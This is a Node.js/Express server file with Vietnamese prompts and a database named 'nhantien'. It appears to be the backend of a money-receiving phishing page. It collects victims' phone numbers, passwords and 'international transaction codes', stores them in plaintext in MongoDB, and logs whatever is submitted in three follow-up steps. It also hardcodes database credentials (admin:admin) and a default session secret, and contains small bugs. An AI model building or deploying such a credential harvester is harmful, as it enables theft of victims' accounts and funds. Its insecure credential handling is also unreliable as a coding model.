var express = require("express");
var session = require("express-session");
var expressValidator = require('express-validator');

var bodyParser = require('body-parser');
var mongoose = require("mongoose");
var Info = require("./models/InFo");
var app = express();
app.use(bodyParser.urlencoded({ extended: false }));

app.use(expressValidator());
// parse application/json
app.use(bodyParser.json());
app.use(express.static('public'));

// Connect to Mongo
app.use(session({
    secret: 'keyboard cat',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false }
  }))

// Or:
try {
   mongoose.connect('mongodb+srv://admin:admin@cluster0-ixpng.mongodb.net/nhantien?retryWrites=true&w=majority', { useNewUrlParser: true },(erro)=>{
       if(erro){
           console.log("Erro Connect To DB");
       }else{
           console.log("Connected to DB");
       }
   });
} catch (error) {
  
        handleError(error); 
}
app.set('view engine', 'ejs');
app.get("/",(req,res)=>{
 
    res.render('login',{erro:null});
    
})

app.get("/Buoc-1",(req,res)=>{
  
    if(req.session.InfoId== undefined){
        res.redirect("/");
    }
    else{
        res.render("buoc1",{erro:null});
    }
    
})
app.get("/Buoc-2",(req,res)=>{
    res.render("buoc2");
})
app.get("/Buoc-3",(req,res)=>{
    res.render("buoc3");
})
app.post("/",(req,res)=>{
   
    req.checkBody('SDT').notEmpty().withMessage("Vui Lòng Nhập Số Điện Thoại").isNumeric().withMessage("Vui Lòng Nhập Đúng SDT");
    req.checkBody('password').notEmpty().withMessage("Vui Lòng Nhập Mật Khẩu");
    req.checkBody('magd').notEmpty().withMessage("Vui Lòng Nhập Mã Giao Dịch");
    var erro = req.validationErrors(true);
    if(erro){
        
        res.render("login",{erro});
    }
    else{
        var obj={ phonenumber:req.body.SDT,
            passwowrd:req.body.password,
            Internationaltransactioncode:req.body.magd
        }
        //console.log(obj);
        Info.findOne(obj,(erro,result)=>{
            if(result){
                // if logined previous
                res.redirect("/Buoc-1");
            }
            else{
                Info.create(obj,(err,info)=>{
                    if(erro){
                        console.log("Đã Xảy Ra Lỗi");
                        res.redirect("/Buoc-1");
                    }
                    else{
                        //console.log(info);
                        req.session.InfoId = info._id;
                        console.log(req.session.InfoId);
                        res.redirect("/Buoc-1");
                    }
    
                })
            }
        })
    }
    
    
    
    
})
app.post("/actionstep1",(req,res)=>{
    console.log(req.body);
    res.redirect("/Buoc-2");
})
app.post("/actionstep2",(req,res)=>{
    console.log(req.body);
    res.redirect("/Buoc-3");
})
app.post("/actionstep3",(req,res)=>{
    console.log(req.body);
    res.redirect("/");
})
app.listen(80,()=>{
    console.log("APp đang chạy trên port 8000");
})